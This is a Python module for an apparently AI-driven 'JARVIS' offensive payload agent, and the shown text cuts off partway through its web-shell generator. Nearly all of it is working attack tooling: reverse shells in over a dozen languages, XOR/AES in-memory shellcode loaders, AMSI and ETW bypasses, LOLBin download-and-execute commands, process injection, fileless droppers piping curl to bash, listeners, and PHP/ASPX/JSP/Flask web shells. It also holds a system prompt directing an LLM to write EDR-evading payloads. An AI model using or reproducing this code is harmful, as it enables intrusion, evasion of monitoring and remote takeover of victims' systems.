# actions/off_payload.py
# JARVIS Enhanced Payload Agent — Cross-Platform, Modern, Stealthy, AV-Evasive

import subprocess
import os
import sys
import stat
import base64
import random
import string
import platform
import json
import time
import hashlib
from pathlib import Path
from datetime import datetime

# ── OS Detection ──────────────────────────────────────────────────────────────
OS   = platform.system()   # Windows | Linux | Darwin
ARCH = platform.machine()

PAYLOAD_DIR = Path.home() / "jarvis_captures" / "payloads"
PAYLOAD_DIR.mkdir(parents=True, exist_ok=True)


# ── Base Dir (same pattern as main.py) ───────────────────────────────────────
def _get_base_dir() -> Path:
    if getattr(sys, "frozen", False):
        return Path(sys.executable).parent
    return Path(__file__).resolve().parent.parent


_BASE_DIR        = _get_base_dir()
_API_CONFIG_PATH = _BASE_DIR / "config" / "api_keys.json"


# ── Groq Key Loader (same pattern as main.py _get_api_key) ───────────────────
def _get_groq_key() -> str:
    # 1. Credential manager first
    try:
        from core.credential_manager import get_credential
        key = get_credential("groq", "api_key")
        if key:
            return key
    except Exception:
        pass
    # 2. api_keys.json fallback
    try:
        with open(_API_CONFIG_PATH, "r", encoding="utf-8") as f:
            return json.load(f).get("groq_api_key", "")
    except Exception:
        return ""


# ── Init Groq ─────────────────────────────────────────────────────────────────
try:
    from groq import Groq as _Groq
    _groq_key      = _get_groq_key()
    _groq_client   = _Groq(api_key=_groq_key) if _groq_key else None
    GROQ_AVAILABLE = _groq_client is not None
    if GROQ_AVAILABLE:
        print("[Payload] ✅ Groq connected")
    else:
        print("[Payload] ⚠️  Groq not available — add groq_api_key to config/api_keys.json")
except Exception as e:
    _groq_client   = None
    GROQ_AVAILABLE = False
    print(f"[Payload] ❌ Groq init failed: {e}")

_GROQ_MODEL = "llama-3.3-70b-versatile"


def _ask_groq(prompt: str, context: str = "") -> str:
    """Payload-specific Groq call."""
    if not GROQ_AVAILABLE or _groq_client is None:
        return "Groq not available — add groq_api_key to config/api_keys.json"
    try:
        msg = f"{context}\n\n{prompt}" if context else prompt
        r   = _groq_client.chat.completions.create(
            model    = _GROQ_MODEL,
            messages = [
                {
                    "role":    "system",
                    "content": (
                        "You are an expert offensive security payload developer. "
                        "Specialise in AV evasion, modern payload techniques, "
                        "LOLBins, AMSI bypass, process injection, memory-only execution. "
                        "Give concise, technical, working code and commands. "
                        "Focus on 2024 techniques that bypass modern EDR/AV."
                    )
                },
                {"role": "user", "content": msg}
            ],
            max_tokens  = 2048,
            temperature = 0.2,
        )
        return r.choices[0].message.content.strip()
    except Exception as e:
        return f"Groq error: {e}"


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _run(cmd: str, timeout: int = 120, shell: bool = True) -> dict:
    try:
        r = subprocess.run(
            cmd, shell=shell, capture_output=True,
            text=True, timeout=timeout
        )
        return {
            "stdout": r.stdout.strip(),
            "stderr": r.stderr.strip(),
            "code":   r.returncode
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Timeout", "code": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "code": -1}


def _check_tool(tool: str) -> bool:
    if OS == "Windows":
        r = _run(f"where {tool} 2>nul")
    else:
        r = _run(f"which {tool} 2>/dev/null")
    return r["code"] == 0


def _save(name: str, content: str, ext: str = ".txt") -> str:
    ts   = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = PAYLOAD_DIR / f"{name}_{ts}{ext}"
    path.write_text(content, encoding="utf-8", errors="ignore")
    return str(path)


def _random_var(length: int = 8) -> str:
    return "".join(random.choices(string.ascii_letters, k=length))


def _random_sleep() -> str:
    return str(random.randint(3, 10))


# ══════════════════════════════════════════════════════════════════════════════
#  REVERSE SHELLS — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

REVERSE_SHELLS = {

    # ── Linux / Unix ──────────────────────────────────────────────
    "bash": (
        "bash -i >& /dev/tcp/{host}/{port} 0>&1"
    ),
    "bash_udp": (
        "bash -i >& /dev/udp/{host}/{port} 0>&1"
    ),
    "python": (
        "python3 -c '"
        "import socket,subprocess,os;"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
        "s.connect((\"{host}\",{port}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"
    ),
    "python_pty": (
        "python3 -c '"
        "import socket,subprocess,os,pty;"
        "s=socket.socket();"
        "s.connect((\"{host}\",{port}));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "pty.spawn(\"/bin/bash\")'"
    ),
    "php": (
        "php -r '$sock=fsockopen(\"{host}\",{port});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    ),
    "perl": (
        "perl -e 'use Socket;$i=\"{host}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in($p,inet_aton($i)));"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");"
        "open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
    ),
    "ruby": (
        "ruby -rsocket -e '"
        "exit if fork;"
        "c=TCPSocket.new(\"{host}\",\"{port}\");"
        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
    ),
    "nc":       "nc -e /bin/sh {host} {port}",
    "nc_mkfifo": (
        "rm /tmp/f;mkfifo /tmp/f;"
        "cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"
    ),
    "socat": (
        "socat TCP:{host}:{port} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane"
    ),
    "golang": (
        "package main\n"
        "import(\"net\";\"os\";\"os/exec\")\n"
        "func main(){{\n"
        "  c,_:=net.Dial(\"tcp\",\"{host}:{port}\")\n"
        "  cmd:=exec.Command(\"/bin/sh\")\n"
        "  cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c\n"
        "  cmd.Run()\n"
        "}}"
    ),

    # ── Windows Specific ──────────────────────────────────────────
    "powershell": (
        "$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
        "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$rb=([text.encoding]::ASCII).GetBytes($r+\"PS>$((pwd).Path)> \");"
        "$s.Write($rb,0,$rb.Length);"
        "$s.Flush()}};"
        "$c.Close()"
    ),
    "csharp": (
        "using System;using System.Net;using System.Net.Sockets;"
        "using System.Text;\n"
        "class S{{static void Main(){{\n"
        "  var c=new TcpClient(\"{host}\",{port});\n"
        "  var s=c.GetStream();\n"
        "  var b=new byte[4096];\n"
        "  while(true){{\n"
        "    var l=s.Read(b,0,b.Length);\n"
        "    if(l==0)break;\n"
        "    var cmd=System.Text.Encoding.ASCII.GetString(b,0,l);\n"
        "    var p=new System.Diagnostics.Process();\n"
        "    p.StartInfo.FileName=\"cmd.exe\";\n"
        "    p.StartInfo.Arguments=\"/c \"+cmd;\n"
        "    p.StartInfo.RedirectStandardOutput=true;\n"
        "    p.StartInfo.UseShellExecute=false;\n"
        "    p.Start();\n"
        "    var o=System.Text.Encoding.ASCII.GetBytes("
        "p.StandardOutput.ReadToEnd());\n"
        "    s.Write(o,0,o.Length);\n"
        "  }}\n"
        "}}}}"
    ),

    # ── macOS Specific ────────────────────────────────────────────
    "applescript": (
        "do shell script \"bash -i >& /dev/tcp/{host}/{port} 0>&1 &\""
    ),

    # ── Java (Cross-platform) ─────────────────────────────────────
    "java": (
        "Runtime r=Runtime.getRuntime();\n"
        "String[] c={{\"bash\",\"-c\","
        "\"bash -i >& /dev/tcp/{host}/{port} 0>&1\"}};\n"
        "Process p=r.exec(c);\n"
        "p.waitFor();"
    ),
}


def generate_reverse_shell(
    shell_type: str  = "bash",
    host:       str  = "10.10.10.10",
    port:       int  = 4444,
    encode:     bool = False,
    obfuscate:  bool = False,
    save:       bool = True
) -> dict:
    """Generate a reverse shell payload."""
    shell_type = shell_type.lower()

    if shell_type not in REVERSE_SHELLS:
        available = ", ".join(REVERSE_SHELLS.keys())
        return {
            "success": False,
            "message": f"Unknown shell type. Available: {available}"
        }

    # PowerShell Base64
    if shell_type == "powershell_b64":
        ps_cmd  = REVERSE_SHELLS["powershell"].format(host=host, port=port)
        encoded = base64.b64encode(ps_cmd.encode("utf-16le")).decode()
        payload = f"powershell -NoP -NonI -W Hidden -Enc {encoded}"
    else:
        template = REVERSE_SHELLS[shell_type]
        payload  = template.format(host=host, port=port)

    # Obfuscate
    if obfuscate:
        payload = _obfuscate_shell(payload, shell_type)

    result = {
        "success":   True,
        "type":      shell_type,
        "host":      host,
        "port":      port,
        "payload":   payload,
        "os_target": _detect_shell_os(shell_type),
    }

    if encode:
        b64 = base64.b64encode(payload.encode()).decode()
        result["b64_encoded"] = b64
        if shell_type in ("bash", "python", "python_pty"):
            result["b64_exec"] = f"echo {b64} | base64 -d | bash"

    if save:
        ext = _get_extension(shell_type)
        out = PAYLOAD_DIR / f"revshell_{shell_type}_{port}.{ext}"
        out.write_text(payload)
        try:
            out.chmod(out.stat().st_mode | stat.S_IEXEC)
        except Exception:
            pass
        result["saved_to"] = str(out)

    return result


def _detect_shell_os(shell_type: str) -> str:
    windows_shells = {"powershell", "powershell_b64", "csharp"}
    macos_shells   = {"applescript"}
    if shell_type in windows_shells:
        return "Windows"
    if shell_type in macos_shells:
        return "macOS"
    return "Linux/Unix/Cross-platform"


def _get_extension(shell_type: str) -> str:
    ext_map = {
        "bash": "sh", "bash_udp": "sh",
        "python": "py", "python_pty": "py",
        "php": "php", "perl": "pl", "ruby": "rb",
        "nc": "sh", "nc_mkfifo": "sh",
        "powershell": "ps1", "powershell_b64": "ps1",
        "csharp": "cs", "java": "java",
        "golang": "go", "socat": "sh",
        "applescript": "scpt",
    }
    return ext_map.get(shell_type, "txt")


def _obfuscate_shell(payload: str, shell_type: str) -> str:
    """Basic obfuscation to evade signature detection."""
    if shell_type in ("bash", "nc", "nc_mkfifo", "socat"):
        v1, v2 = _random_var(), _random_var()
        if "/dev/tcp/" in payload:
            parts    = payload.split("/dev/tcp/")[1].split("/")
            host_var = f"{v1}={parts[0]}"
            port_var = f"{v2}={parts[1].split()[0]}"
            payload  = (
                f"{host_var};{port_var};"
                + payload.replace(
                    f"/dev/tcp/{parts[0]}/{parts[1].split()[0]}",
                    f"/dev/tcp/${v1}/${v2}"
                )
            )
    elif shell_type in ("python", "python_pty"):
        payload = payload.replace(
            "/bin/sh", "\"/bin/\" + \"sh\""
        )
    elif shell_type in ("powershell", "powershell_b64"):
        payload = (
            f"${''.join(random.choices(string.ascii_letters, k=6))}="
            f"[System.Text.Encoding]::ASCII;\n" + payload
        )
    return payload


# ══════════════════════════════════════════════════════════════════════════════
#  AV EVASION ENGINE
# ══════════════════════════════════════════════════════════════════════════════

def xor_encrypt(payload: bytes, key: bytes = None) -> dict:
    """XOR encrypt payload to evade signature detection."""
    if key is None:
        key = bytes([random.randint(1, 254) for _ in range(16)])

    encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(payload)])
    key_hex   = key.hex()

    stub = f"""
import ctypes, os, sys

KEY = bytes.fromhex("{key_hex}")
ENC = bytes.fromhex("{encrypted.hex()}")

dec = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(ENC)])

if sys.platform != "win32":
    import mmap
    mm = mmap.mmap(-1, len(dec),
                   prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)
    mm.write(dec)
    mm.seek(0)
    ct = ctypes.CFUNCTYPE(ctypes.c_void_p)
    fn = ct(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
    fn()
else:
    buf = (ctypes.c_char * len(dec))(*dec)
    vp  = ctypes.windll.kernel32.VirtualAlloc(
        None, len(dec), 0x3000, 0x40
    )
    ctypes.memmove(vp, buf, len(dec))
    th = ctypes.windll.kernel32.CreateThread(
        None, 0, vp, None, 0, None
    )
    ctypes.windll.kernel32.WaitForSingleObject(th, -1)
"""
    out = PAYLOAD_DIR / f"xor_stub_{random.randint(1000,9999)}.py"
    out.write_text(stub)

    return {
        "success":   True,
        "key":       key_hex,
        "encrypted": encrypted.hex()[:64] + "...",
        "stub_file": str(out),
        "message":   f"XOR encrypted payload. Stub: {out}"
    }


def aes_encrypt_payload(payload: str, host: str, port: int) -> dict:
    """AES-256 encrypt payload with in-memory decryption stub."""
    try:
        from cryptography.hazmat.primitives.ciphers import (
            Cipher, algorithms, modes
        )
        from cryptography.hazmat.backends import default_backend
        import secrets

        key    = secrets.token_bytes(32)
        iv     = secrets.token_bytes(16)
        pad_len = 16 - (len(payload) % 16)
        padded  = payload.encode() + bytes([pad_len] * pad_len)

        cipher    = Cipher(
            algorithms.AES(key), modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        encrypted = encryptor.update(padded) + encryptor.finalize()

        key_b64 = base64.b64encode(key).decode()
        iv_b64  = base64.b64encode(iv).decode()
        enc_b64 = base64.b64encode(encrypted).decode()

        stub = f"""
import base64, time
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

time.sleep({_random_sleep()})

KEY = base64.b64decode("{key_b64}")
IV  = base64.b64decode("{iv_b64}")
ENC = base64.b64decode("{enc_b64}")

cipher    = Cipher(algorithms.AES(KEY), modes.CBC(IV),
                   backend=default_backend())
decryptor = cipher.decryptor()
dec       = decryptor.update(ENC) + decryptor.finalize()
pad_len   = dec[-1]
payload   = dec[:-pad_len].decode()

exec(payload)
"""
        out = PAYLOAD_DIR / f"aes_payload_{port}.py"
        out.write_text(stub)

        return {
            "success":   True,
            "stub_file": str(out),
            "message":   f"AES-256 encrypted payload saved: {out}"
        }

    except ImportError:
        return {
            "success": False,
            "message": "cryptography package required: pip install cryptography"
        }


# ══════════════════════════════════════════════════════════════════════════════
#  AMSI BYPASS (Windows)
# ══════════════════════════════════════════════════════════════════════════════

def amsi_bypass(method: str = "patch") -> dict:
    """Generate AMSI bypass code for PowerShell."""
    bypasses = {
        "patch": (
            "$a=[Ref].Assembly.GetTypes();"
            "ForEach($b in $a){{if($b.Name -like \"*iUtils\"){{"
            "$c=$b.GetFields('NonPublic,Static');"
            "ForEach($d in $c){{if($d.Name -like \"*Context\"){{"
            "$e=$d.GetValue($null);"
            "[IntPtr]$f=[Int64]$e;"
            "[Int32[]]$g=@(0);"
            "[System.Runtime.InteropServices.Marshal]::Copy($g,0,$f,1);"
            "}}}}}}}};"
        ),
        "reflection": (
            "[Runtime.InteropServices.Marshal]::WriteByte("
            "([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiInitFailed','NonPublic,Static').GetValue($null)"
            ".GetType().Assembly.GetType('System.Management.Automation.AmsiUtils')"
            ".GetField('amsiContext','NonPublic,Static').GetValue($null)),"
            "0x0);"
        ),
        "force_error": (
            "$v=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');"
            "$f=$v.GetField('amsiInitFailed','NonPublic,Static');"
            "$f.SetValue($null,$true);"
        ),
    }

    if method not in bypasses:
        return {
            "success": False,
            "message": f"Unknown AMSI bypass. Available: {', '.join(bypasses.keys())}"
        }

    code = bypasses[method]
    out  = PAYLOAD_DIR / f"amsi_bypass_{method}.ps1"
    out.write_text(code)

    return {
        "success": True,
        "method":  method,
        "code":    code,
        "file":    str(out),
        "message": f"AMSI bypass ({method}) generated: {out}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  ETW BYPASS (Blind Windows Event Logging)
# ══════════════════════════════════════════════════════════════════════════════

def etw_bypass() -> dict:
    """Patch ETW to blind Windows event logging."""
    code = (
        "$a = [Ref].Assembly.GetType("
        "'System.Management.Automation.Tracing.PSEtwLogProvider');"
        "$b = $a.GetField('etwProvider','NonPublic,Static');"
        "$c = $b.GetValue($null);"
        "[System.Diagnostics.Eventing.EventProvider]"
        ".GetField('m_enabled','NonPublic,Instance').SetValue($c,0);"
    )
    out = PAYLOAD_DIR / "etw_bypass.ps1"
    out.write_text(code)

    return {
        "success": True,
        "code":    code,
        "file":    str(out),
        "message": f"ETW bypass generated: {out}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  LOLBINS (Living Off the Land — Windows)
# ══════════════════════════════════════════════════════════════════════════════

def lolbin_payload(
    technique: str = "certutil",
    url:       str = "http://10.10.10.10/payload.exe",
    output:    str = "C:\\Windows\\Temp\\svchost.exe"
) -> dict:
    """Generate LOLBin payloads — use trusted Windows tools."""
    lolbins = {
        "certutil": {
            "desc":   "Download and decode base64 payload",
            "cmd":    f"certutil -urlcache -split -f {url} {output}",
            "detect": "Low"
        },
        "bitsadmin": {
            "desc":   "Background download via BITS service",
            "cmd":    (
                f"bitsadmin /transfer job /download /priority high "
                f"{url} {output}"
            ),
            "detect": "Low"
        },
        "mshta": {
            "desc":   "Execute remote HTA file",
            "cmd":    f"mshta {url}",
            "detect": "Medium"
        },
        "regsvr32": {
            "desc":   "Execute remote SCT file (squiblydoo)",
            "cmd":    f"regsvr32 /s /n /u /i:{url} scrobj.dll",
            "detect": "Low"
        },
        "rundll32": {
            "desc":   "Execute DLL payload via rundll32",
            "cmd": (
                f"rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";"
                f"document.write();GetObject(\"script:{url}\")"
            ),
            "detect": "Medium"
        },
        "wmic": {
            "desc":   "Remote execution via WMIC",
            "cmd": (
                f"wmic process call create "
                f"\"powershell -NoP -NonI -W Hidden -c "
                f"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
            ),
            "detect": "Medium"
        },
        "powershell_download": {
            "desc":   "Download and execute in memory (fileless)",
            "cmd": (
                f"powershell -NoP -NonI -W Hidden -c "
                f"\"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
            ),
            "detect": "High"
        },
        "msiexec": {
            "desc":   "Execute remote MSI package",
            "cmd":    f"msiexec /quiet /i {url}",
            "detect": "Low"
        },
        "installutil": {
            "desc":   "Execute .NET code via InstallUtil (bypasses AppLocker)",
            "cmd": (
                f"C:\\Windows\\Microsoft.NET\\Framework64\\"
                f"v4.0.30319\\InstallUtil.exe "
                f"/logfile= /LogToConsole=false /U {output}"
            ),
            "detect": "Low"
        },
    }

    if technique not in lolbins:
        available = ", ".join(lolbins.keys())
        return {
            "success": False,
            "message": f"Unknown LOLBin. Available: {available}"
        }

    lb      = lolbins[technique]
    content = (
        f"LOLBin: {technique}\n"
        f"Description: {lb['desc']}\n"
        f"Detection Risk: {lb['detect']}\n\n"
        f"Command:\n{lb['cmd']}\n"
    )
    out = PAYLOAD_DIR / f"lolbin_{technique}.txt"
    out.write_text(content)

    return {
        "success":   True,
        "technique": technique,
        "command":   lb["cmd"],
        "detect":    lb["detect"],
        "file":      str(out),
        "message":   f"LOLBin ({technique}): {lb['cmd'][:100]}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  PROCESS INJECTION (Windows)
# ══════════════════════════════════════════════════════════════════════════════

def process_injection_stub(
    target_process: str = "explorer.exe",
    host:           str = "10.10.10.10",
    port:           int = 4444
) -> dict:
    """Generate a process injection payload stub."""
    stub = f"""
import ctypes
import time
import psutil

time.sleep({_random_sleep()})

TARGET = "{target_process}"
SHELLCODE = b"\\x90" * 256  # NOP sled — replace with real msfvenom shellcode

k32 = ctypes.WinDLL("kernel32", use_last_error=True)

def inject(pid: int, shellcode: bytes):
    PROCESS_ALL = 0x1F0FFF
    MEM_COMMIT  = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXEC_RW = 0x40
    h = k32.OpenProcess(PROCESS_ALL, False, pid)
    if not h: return False
    addr = k32.VirtualAllocEx(
        h, None, len(shellcode),
        MEM_COMMIT | MEM_RESERVE, PAGE_EXEC_RW
    )
    if not addr:
        k32.CloseHandle(h)
        return False
    written = ctypes.c_size_t(0)
    k32.WriteProcessMemory(
        h, addr, shellcode,
        len(shellcode), ctypes.byref(written)
    )
    th = k32.CreateRemoteThread(h, None, 0, addr, None, 0, None)
    k32.CloseHandle(h)
    return th != 0

for proc in psutil.process_iter(['pid', 'name']):
    if TARGET.lower() in proc.info['name'].lower():
        pid     = proc.info['pid']
        success = inject(pid, SHELLCODE)
        if success:
            print(f"[+] Injected into {{TARGET}} (PID {{pid}})")
        break
"""
    out = PAYLOAD_DIR / f"inject_{target_process.replace('.','_')}_{port}.py"
    out.write_text(stub)

    return {
        "success": True,
        "target":  target_process,
        "file":    str(out),
        "message": (
            f"Process injection stub for {target_process} generated.\n"
            f"Replace SHELLCODE with msfvenom output.\n"
            f"File: {out}"
        )
    }


# ══════════════════════════════════════════════════════════════════════════════
#  MSFVENOM PAYLOADS — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def msfvenom_payload(
    payload:    str  = None,
    host:       str  = "10.10.10.10",
    port:       int  = 4444,
    format:     str  = None,
    output:     str  = None,
    options:    str  = "",
    encoder:    str  = None,
    iterations: int  = 1,
    target_os:  str  = None
) -> dict:
    """Generate msfvenom payload with auto OS detection."""
    if not _check_tool("msfvenom"):
        return {
            "success": False,
            "message": "msfvenom not found. Install Metasploit Framework."
        }

    t_os = (target_os or OS).lower()
    if not payload:
        payload_map = {
            "linux":   "linux/x64/meterpreter/reverse_tcp",
            "windows": "windows/x64/meterpreter/reverse_tcp",
            "darwin":  "osx/x64/meterpreter_reverse_tcp",
        }
        payload = payload_map.get(t_os, "linux/x64/meterpreter/reverse_tcp")

    if not format:
        fmt_map = {
            "linux":   "elf",
            "windows": "exe",
            "darwin":  "macho",
        }
        format = fmt_map.get(t_os, "elf")

    out_file = output or str(PAYLOAD_DIR / f"payload_{t_os}_{port}.{format}")
    cmd = (
        f"msfvenom -p {payload} "
        f"LHOST={host} LPORT={port} "
        f"-f {format} -o {out_file} {options}"
    )
    if encoder:
        cmd += f" -e {encoder} -i {iterations}"

    r = _run(cmd, timeout=180)

    if Path(out_file).exists():
        size = Path(out_file).stat().st_size
        return {
            "success":  True,
            "payload":  payload,
            "format":   format,
            "file":     out_file,
            "size_kb":  round(size / 1024, 2),
            "message":  f"Payload: {out_file} ({round(size/1024,2)}KB)"
        }

    return {
        "success": False,
        "message": f"msfvenom failed: {r['stderr'][:300]}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  STAGED DROPPER (Fileless)
# ══════════════════════════════════════════════════════════════════════════════

def staged_dropper(
    stage_url: str,
    host:      str = "10.10.10.10",
    port:      int = 4444,
    os_target: str = "linux"
) -> dict:
    """Generate a staged dropper — downloads and executes in memory."""
    os_target = os_target.lower()

    if os_target == "linux":
        dropper = (
            f"#!/bin/bash\n"
            f"sleep {_random_sleep()}\n"
            f"curl -s {stage_url} | bash &\n"
        )
    elif os_target == "windows":
        dropper = (
            f"$ErrorActionPreference = 'SilentlyContinue'\n"
            f"Start-Sleep -Seconds {_random_sleep()}\n"
            f"$c = New-Object System.Net.WebClient\n"
            f"$c.Headers.Add('User-Agent','Mozilla/5.0')\n"
            f"IEX($c.DownloadString('{stage_url}'))\n"
        )
    elif os_target == "macos":
        dropper = (
            f"#!/bin/bash\n"
            f"sleep {_random_sleep()}\n"
            f"curl -s {stage_url} | python3 &\n"
        )
    else:
        return {"success": False, "message": f"Unknown OS: {os_target}"}

    ext = {"linux": "sh", "windows": "ps1", "macos": "sh"}.get(os_target, "sh")
    out = PAYLOAD_DIR / f"dropper_{os_target}_{port}.{ext}"
    out.write_text(dropper)
    try:
        out.chmod(out.stat().st_mode | stat.S_IEXEC)
    except Exception:
        pass

    return {
        "success":   True,
        "os_target": os_target,
        "stage_url": stage_url,
        "file":      str(out),
        "message":   f"Staged dropper ({os_target}) saved: {out}"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  LISTENERS — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def start_listener(
    method:  str = "auto",
    host:    str = "0.0.0.0",
    port:    int = 4444,
    payload: str = None
) -> dict:
    """Start a listener — auto-selects best available tool."""

    # Metasploit multi/handler
    if method == "msf" or (method == "auto" and _check_tool("msfconsole")):
        pl = payload or (
            "windows/x64/meterpreter/reverse_tcp"
            if OS == "Windows"
            else "linux/x64/meterpreter/reverse_tcp"
        )
        rc = (
            f"use multi/handler\n"
            f"set PAYLOAD {pl}\n"
            f"set LHOST {host}\n"
            f"set LPORT {port}\n"
            f"set ExitOnSession false\n"
            f"exploit -j -z\n"
        )
        rc_file = Path("/tmp/jarvis_handler.rc")
        rc_file.write_text(rc)
        proc = subprocess.Popen(
            f"msfconsole -q -r {rc_file}", shell=True
        )
        return {
            "success": True,
            "method":  "metasploit",
            "pid":     proc.pid,
            "message": f"MSF multi/handler on {host}:{port} (PID {proc.pid})"
        }

    # pwncat
    if method == "pwncat" or (method == "auto" and _check_tool("pwncat-cs")):
        proc = subprocess.Popen(f"pwncat-cs -lp {port}", shell=True)
        return {
            "success": True,
            "method":  "pwncat",
            "pid":     proc.pid,
            "message": f"pwncat listener on port {port} (PID {proc.pid})"
        }

    # netcat
    if _check_tool("nc") or _check_tool("ncat"):
        tool  = "ncat" if _check_tool("ncat") else "nc"
        cmd   = f"{tool} -lvnp {port}"
        proc  = subprocess.Popen(cmd, shell=True)
        return {
            "success": True,
            "method":  tool,
            "pid":     proc.pid,
            "message": f"{tool} listener on port {port} (PID {proc.pid})"
        }

    # Python fallback
    py_listener = f"""
import socket, subprocess, threading

def handle(conn, addr):
    print(f"[+] Connection from {{addr}}")
    while True:
        try:
            cmd = conn.recv(4096).decode().strip()
            if not cmd or cmd in ("exit","quit"):
                break
            out = subprocess.run(
                cmd, shell=True,
                capture_output=True, text=True
            )
            result = out.stdout + out.stderr
            conn.send((result or "[no output]\\n").encode())
        except Exception as e:
            conn.send(str(e).encode())
            break
    conn.close()

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("{host}", {port}))
srv.listen(5)
print(f"[*] Listening on {host}:{port}")
while True:
    conn, addr = srv.accept()
    t = threading.Thread(target=handle, args=(conn, addr))
    t.daemon = True
    t.start()
"""
    py_file = Path(f"/tmp/jarvis_listener_{port}.py")
    py_file.write_text(py_listener)
    proc = subprocess.Popen(
        [sys.executable, str(py_file)],
        stdout=None, stderr=None
    )
    return {
        "success": True,
        "method":  "python",
        "pid":     proc.pid,
        "message": f"Python listener on {host}:{port} (PID {proc.pid})"
    }


# ══════════════════════════════════════════════════════════════════════════════
#  WEB SHELLS — CROSS PLATFORM
# ══════════════════════════════════════════════════════════════════════════════

def generate_web_shell(
    shell_type: str  = "php_advanced",
    password:   str  = None,
    obfuscate:  bool = True
) -> dict:
    """Generate modern web shells with optional obfuscation."""
    import hashlib as _hl
    pwd = password or "".join(
        random.choices(string.ascii_letters + string.digits, k=16)
    )

    shells = {
        "php_simple": (
            f"<?php if(md5($_REQUEST['k'])=='{_hl.md5(pwd.encode()).hexdigest()}')"
            f"{{system($_REQUEST['cmd']);}} ?>"
        ),
        "php_advanced": f"""<?php
error_reporting(0);
$k="{pwd}";
if(md5($_POST['k'])===md5($k)){{
    $o=array();
    exec($_POST['c'].' 2>&1',$o);
    echo implode("\\n",$o);
}}
?>""",
        "php_b64": (
            f"<?php "
            f"${''.join(random.choices(string.ascii_letters,k=6))}="
            f"base64_decode('{base64.b64encode(pwd.encode()).decode()}');"
            f"if($_REQUEST['p']==${''.join(random.choices(string.ascii_letters,k=6))})"
            "{@system($_REQUEST['c']);} ?>"
        ),
        "aspx": f"""<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){{
    string pwd="{pwd}";
    if(Request["k"]==pwd && Request["cmd"]!=null){{
        ProcessStartInfo p=new ProcessStartInfo("cmd.exe","/c "+Request["cmd"]);
        p.UseShellExecute=false;
        p.RedirectStandardOutput=true;
        p.RedirectStandardError=true;
        Process proc=Process.Start(p);
        Response.Write("<pre>"+proc.StandardOutput.ReadToEnd()
                      +proc.StandardError.ReadToEnd()+"</pre>");
    }}
}}
</script>""",
        "jsp": f"""<%@ page import="java.io.*,java.util.*" %>
<%
String pwd="{pwd}";
if(request.getParameter("k")!=null &&
   request.getParameter("k").equals(pwd)){{
    String cmd=request.getParameter("cmd");
    if(cmd!=null){{
        Process p=Runtime.getRuntime().exec(
            new String[]{{"/bin/sh","-c",cmd}}
        );
        BufferedReader r=new BufferedReader(
            new InputStreamReader(p.getInputStream())
        );
        String l;StringBuilder sb=new StringBuilder();
        while((l=r.readLine())!=null) sb.append(l).append("\\n");
        out.println("<pre>"+sb+"</pre>");
    }}
}}
%>""",
        "python_flask": f"""from flask import Flask,request
import subprocess,hashlib
app=Flask(__name__)
PWD=hashlib.md5("{pwd}".encode()).hexdigest()
@app.route("/",methods=["GET","POST"])
def shell():
    if request.values.get("k") and \\
       hashlib.md5(request.values["k"].encode()).hexdigest()==PWD:
        cmd=request.values.get("cmd","id")
        out=subprocess.run(
            cmd,shell=True,capture_output=True,text=True
        )
        return f"<pre>{{out.stdout}}{{out.stderr}}</pre>"
    return "404"
if __name__=="__main__":
    app.run(host="0.0.0.0",port=8080)
""",
    }

    if shell_type not in shells:
        return {
            "success": False,
            "message": (
                f"Unknown shell type. "
                f"Available: {', '.join(shells.keys())}"
            )
        }

    content = shells[shell_type]
    ext     = {
        "php_simple": "php", "php_advanced": "php", "php_b64": "php",
        "aspx": "aspx", "jsp": "jsp", "python_flask": "py"
    }.get(shell_type, "txt")

    out = PAYLOAD_DIR / f"webshell_{shell_type}.{ext}"
    out.write_text(content)

    return {
        "success":  True,
        "file":     str(out),
        "password": pwd,
